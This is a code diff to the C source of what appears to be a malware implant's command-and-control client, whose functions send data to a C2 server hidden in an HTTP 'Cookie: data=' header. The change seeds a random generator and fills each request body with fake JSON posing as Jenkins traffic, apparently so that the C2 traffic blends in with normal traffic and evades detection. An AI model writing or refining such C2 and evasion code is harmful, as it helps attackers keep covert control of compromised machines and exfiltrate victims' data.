@@ -128,6 +128,8 @@ int SetupComms() {
         return -1;
     }
 
+    srand(time(NULL));
+
     return 0;
 }
 
@@ -408,6 +410,7 @@ int c2_recv(char* buffer, int len) {
 int c2_send(char* data, int len) {
     BOOL result;
     char* enc_data;
+    char bogus_data[512];
     int size;
     wchar_t* data_wide; // data in wide char format
     wchar_t* cookie;
@@ -441,13 +444,16 @@ int c2_send(char* data, int len) {
     swprintf(cookie, b64_len+14, L"Cookie: data=%s", data_wide);
     WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
 
+    // Create bogus data for HTTP body
+    sprintf(bogus_data, "{id: %x,\nJenkinsVersion: %.3f,\nvalue: %x%x\n}", rand(), 1.625f, rand(), rand());
+
     result = WinHttpSendRequest(
         hRequest,
         WINHTTP_NO_ADDITIONAL_HEADERS,   // headers
         0,                               // header length
-        WINHTTP_NO_REQUEST_DATA,         // data
-        0,                               // data length
-        0,                               // total length
+        bogus_data,                      // data
+        strlen(bogus_data),              // data length
+        strlen(bogus_data),              // total length
         0                                // optional context?
     );
 
